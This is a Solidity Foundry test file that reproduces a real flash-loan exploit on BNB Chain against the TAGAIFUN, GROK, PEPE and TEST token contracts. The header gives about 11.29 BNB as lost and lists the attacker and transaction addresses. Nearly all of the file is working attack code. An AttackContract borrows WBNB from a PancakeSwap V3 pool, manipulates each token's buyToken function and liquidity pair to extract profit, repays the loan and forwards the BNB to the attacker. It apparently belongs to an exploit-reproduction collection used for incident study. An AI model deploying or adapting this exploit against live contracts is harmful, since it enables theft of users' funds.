// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ 11.29 BNB ($6.4K)
// Attacker : https://bscscan.com/address/0x5d6e908c4cd6eda1c2a9010d1971c7d62bdb5cd3
// Attack Contract : https://bscscan.com/address/0x0e220c6c52d383869a5085ef074b6028254b3462
// Vulnerable Contract : TAGAIFUN, GROK, PEPE, TEST ... TokenContract
// Attack Tx : https://bscscan.com/tx/0xdebaa13fb06134e63879ca6bcb08c5e0290bdbac3acf67914c0b1dcaf0bdc3dd

// @Info
// Vulnerable Contract Code :
//  - TAGAIFUN: https://bscscan.com/address/0x09762e00ce0de8211f7002f70759447b1f2b1892#code
//  - GROK: https://bscscan.com/address/0x02e8ead6de82c8a248ef0eebe145295116d0e4c2#code
//  - PEPE: https://bscscan.com/address/0x6b7e9be56ca035d3471da76caa99f165449697a0#code
//  - TEST: https://bscscan.com/address/0xba0d236fbcbd34052cdab29c4900063f9efe6e4f#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1897115993962635520
// Hacking God : N/A

address constant WBNB_ADDR = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant BSC_USD = 0x55d398326f99059fF775485246999027B3197955;
address constant TAGAIFUN_TOKEN = 0x09762e00Ce0DE8211F7002F70759447B1F2b1892;
address constant GROK_TOKEN = 0x02E8eAd6De82c8a248eF0EebE145295116D0E4C2;
address constant PEPE_TOKEN = 0x6B7e9Be56cA035D3471dA76caa99f165449697A0;
address constant TEST_TOKEN = 0xBA0D236FbcbD34052CdAB29c4900063F9Efe6E4f;
address constant PANCAKE_V3_POOL_BUSD_WBNB = 0x172fcD41E0913e95784454622d1c3724f546f849;
address constant PANCAKE_V2_FACTORY = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
address constant PANCAKE_V2_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

contract Pump_exp is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 47_169_116 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        // Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(0);

        vm.label(WBNB_ADDR, "WBNB");
        vm.label(BSC_USD, "BUSD");
        vm.label(TAGAIFUN_TOKEN, "TAGAIFUN");
        vm.label(GROK_TOKEN, "GROK");
        vm.label(PEPE_TOKEN, "PEPE");
        vm.label(TEST_TOKEN, "TEST");
        vm.label(PANCAKE_V3_POOL_BUSD_WBNB, "PancakeV3Pool: BUSD/WBNB");
        vm.label(PANCAKE_V2_FACTORY, "PancakeSwap: Factory v2");
        vm.label(PANCAKE_V2_ROUTER, "PancakeSwap: Router v2");
    }

    function testExploit() public balanceLog {
        AttackContract attackContract = new AttackContract();
        address[] memory tokenPairs = new address[](4);
        tokenPairs[0] = TAGAIFUN_TOKEN;
        tokenPairs[1] = GROK_TOKEN;
        tokenPairs[2] = PEPE_TOKEN;
        tokenPairs[3] = TEST_TOKEN;
        attackContract.start(tokenPairs);
    }

    receive() external payable {
        // Handle the received funds
    }
}

contract AttackContract {
    address attacker;
    address[] tokenPairs;
    uint256 borrowAmount = 100_000_000_000_000_000_000;

    constructor() {
        attacker = msg.sender;
    }

    function start(address[] memory _tokenPairs) public {
        tokenPairs = _tokenPairs;
        IPancakeV3PoolActions(PANCAKE_V3_POOL_BUSD_WBNB).flash(address(this), 0, borrowAmount, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        uint256 balanceOfWBNB = TokenHelper.getTokenBalance(WBNB_ADDR, address(this));
        WBNB(WBNB_ADDR).withdraw(balanceOfWBNB);

        for (uint256 i = 0; i < tokenPairs.length; i++) {
            address token = tokenPairs[i];

            address pair = IUniswapV2Factory(PANCAKE_V2_FACTORY).getPair(token, WBNB_ADDR);
            IToken(token).buyToken{value: 0.001 ether}(0, address(0), 0, pair);

            WBNB(WBNB_ADDR).deposit{value: 1 ether}();
            WBNB(WBNB_ADDR).transfer(pair, 1 ether);
            IPancakePair(pair).mint(address(this));
            IToken(token).buyToken{value: 20 ether}(0, address(0), 0, address(this));

            TokenHelper.approveToken(token, PANCAKE_V2_ROUTER, type(uint256).max);
            uint256 balanceOfToken = TokenHelper.getTokenBalance(token, address(this));
            address[] memory path = new address[](2);
            path[0] = token;
            path[1] = WBNB_ADDR;
            IPancakeRouter(payable(PANCAKE_V2_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                balanceOfToken, 0, path, address(this), block.timestamp + 1000
            );
        }

        WBNB(WBNB_ADDR).deposit{value: address(this).balance}();
        WBNB(WBNB_ADDR).transfer(PANCAKE_V3_POOL_BUSD_WBNB, borrowAmount + fee1);
        balanceOfWBNB = TokenHelper.getTokenBalance(WBNB_ADDR, address(this));
        WBNB(WBNB_ADDR).withdraw(balanceOfWBNB);

        // Transfer the BNB to the attacker
        payable(attacker).transfer(address(this).balance);
    }

    receive() external payable {
        // Handle the received funds
    }
}

interface IToken is IERC20 {
    function buyToken(
        uint256 expectAmount,
        address sellsman,
        uint16 slippage,
        address receiver
    ) external payable returns (uint256);
}
